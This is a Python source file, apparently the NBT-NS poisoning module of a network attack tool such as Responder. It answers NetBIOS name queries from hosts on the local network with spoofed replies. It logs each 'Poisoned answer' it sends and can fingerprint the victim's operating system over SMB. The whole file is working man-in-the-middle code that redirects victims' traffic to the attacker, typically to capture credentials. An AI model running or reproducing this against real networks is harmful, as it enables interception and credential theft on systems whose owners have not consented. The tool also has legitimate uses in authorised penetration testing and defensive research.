import fingerprint

from packets import NBT_Ans
from SocketServer import BaseRequestHandler
from utils import *

# Define what are we answering to.
def Validate_NBT_NS(data):
	if settings.Config.AnalyzeMode:
		return False
	elif NBT_NS_Role(data[43:46]) == "File Server":
		return True
	elif settings.Config.NBTNSDomain:
		if NBT_NS_Role(data[43:46]) == "Domain Controller":
			return True
	elif settings.Config.Wredirect:
		if NBT_NS_Role(data[43:46]) == "Workstation/Redirector":
			return True
	return False

# NBT_NS Server class.
class NBTNS(BaseRequestHandler):

	def handle(self):

		data, socket = self.request
		Name = Decode_Name(data[13:45])

		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == "\x01\x10":
			Finger = None
			if settings.Config.Finger_On_Off:
				Finger = fingerprint.RunSmbFinger((self.client_address[0],445))

			if settings.Config.AnalyzeMode:  # Analyze Mode
				LineHeader = "[Analyze mode: NBT-NS]"
				print (color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
			else:  # Poisoning Mode
				Buffer = NBT_Ans()
				Buffer.calculate(data)
				socket.sendto(str(Buffer), self.client_address)
				LineHeader = "[*] [NBT-NS]"

				print (color("%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0], Name, NBT_NS_Role(data[43:46])), 2, 1))

			if Finger is not None:
				print (text("[FINGER] OS Version     : %s" % color(Finger[0], 3)))
				print (text("[FINGER] Client Version : %s" % color(Finger[1], 3)))
